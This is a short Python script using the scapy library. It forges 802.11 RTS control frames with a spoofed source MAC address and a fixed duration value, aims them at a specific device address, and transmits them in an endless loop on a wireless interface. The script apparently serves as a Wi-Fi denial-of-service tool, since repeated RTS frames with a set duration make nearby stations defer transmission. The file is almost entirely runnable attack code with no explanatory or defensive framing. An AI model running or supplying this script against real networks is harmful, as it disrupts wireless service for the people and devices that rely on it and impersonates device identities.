#!/usr/bin/python

from scapy.all import Dot11, RadioTap, sendp, hexdump
import struct

INTERFACE = 'wlan0'
CONTROL = 1
RTS = 11
DST_ADDR = '94:94:26:06:49:60'
SRC_ADDR = '22:22:22:22:22:22'

def forgeRTS():
    millis = 615
    blob = struct.pack( "H", millis )
    millis = struct.unpack( ">H", blob )[0]

    dot11 = Dot11( addr1 = DST_ADDR, addr2 = SRC_ADDR,
        type = CONTROL, subtype = RTS, ID = millis )

    return  RadioTap() / dot11


frame = forgeRTS()

frame.show()
print( "\nHexdump of frame:" )
hexdump( frame )

sendp( frame, iface = INTERFACE, inter = 0.1, loop = 1 )
